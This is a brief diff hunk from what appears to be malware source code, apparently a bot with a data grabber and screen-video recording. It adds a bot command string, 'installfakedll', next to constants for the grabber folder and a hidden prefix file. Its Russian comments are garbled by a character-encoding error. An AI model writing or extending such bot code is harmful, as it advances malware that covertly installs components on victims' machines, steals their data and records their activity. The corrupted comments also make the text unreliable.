@@ -57,6 +57,10 @@ CSSTR StrGrabberPath[] = "gdata";  // »м€ рабочей папки грабера
 CSSTR StrPrefixFileName[] = "mnprsdd.dat"; // ‘айл хранени€ префикса
 
 
+// ѕеречень команд, которые может выполн€ь бот
+CSSTR CommandInstallFakeDLL[] = "installfakedll";
+
+
 
 // »мена функций библиотеки видеозаписи.
 CSSTR VideRecFuncRecordProcess[]  = "StartRecPid";
